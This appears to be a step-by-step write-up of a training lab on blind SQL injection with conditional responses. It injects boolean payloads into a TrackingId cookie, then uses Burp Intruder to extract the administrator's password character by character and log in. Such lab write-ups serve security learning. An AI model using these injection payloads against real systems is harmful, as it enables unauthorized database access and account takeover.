# Lab: Blind SQL Injection with Conditional Responses

## Steps to Solve the Lab:

1. **Intercept the Request**  
   - Visit the front page of the shop and use Burp Suite to intercept the request containing the `TrackingId` cookie.
   - The original value of the cookie is `TrackingId=xyz`.

2. **Test the Boolean Condition**  
   - Modify the `TrackingId` cookie to:  
     ```sql
     TrackingId=xyz' AND '1'='1
     ```
   - Verify that the **Welcome back** message appears in the response.
   - Modify the `TrackingId` cookie to:  
     ```sql
     TrackingId=xyz' AND '1'='2
     ```
   - Verify that the **Welcome back** message does not appear in the response.  
     This demonstrates a single boolean condition that can be used to infer the result.

3. **Confirm the Existence of the `users` Table**  
   - Modify the `TrackingId` cookie to:  
     ```sql
     TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
     ```
   - Verify that the condition is true, confirming the existence of the `users` table.

4. **Confirm the Existence of the Administrator User**  
   - Modify the `TrackingId` cookie to:  
     ```sql
     TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
     ```
   - Verify that the condition is true, confirming that there is a user called `administrator`.

5. **Determine the Length of the Administrator's Password**  
   - Modify the `TrackingId` cookie to:  
     ```sql
     TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
     ```
   - Verify that the condition is true, confirming that the password is greater than 1 character in length.
   - Continue testing different lengths:  
     ```sql
     TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
     ```  
     ```sql
     TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
     ```
     Continue until the condition becomes false, and you determine that the password length is 20 characters.

6. **Find the Characters of the Administrator's Password**  
   - Send the request to Burp Intruder and modify the `TrackingId` cookie to:  
     ```sql
     TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
     ```
   - This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value.  
   - Define a payload position around the `a` character in the cookie value. It should look like this:  
     ```sql
     TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
     ```

7. **Set Payloads in Burp Intruder**  
   - In Burp Intruder's **Payloads** tab, set the payload type to **Simple list**.
   - Add a list of lowercase alphanumeric characters (`a-z` and `0-9`) as potential characters for the password.
   - Configure Burp Intruder to **grep** for "Welcome back" in the response to identify when the correct character is found.

8. **Launch the Attack**  
   - Start the attack in Burp Intruder by clicking the **Start attack** button.
   - Review the attack results to find the character at the first position of the password.

9. **Test Each Character Position**  
   - After finding the first character, modify the payload to check subsequent positions.  
     For the second character, change the offset to `2`:  
     ```sql
     TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
     ```
   - Launch the attack and review the results to determine the second character.
   - Repeat this process for each character of the password by increasing the offset (`3`, `4`, etc.) until the entire password is revealed.

10. **Login as the Administrator**  
    - Once the entire password is found, go to the login page and use the discovered password to log in as the administrator.

## Expected Outcome:
- You should be able to determine the full password for the `administrator` user through a series of tests.
- Upon successfully logging in with the administrator's credentials, you will have completed the attack.
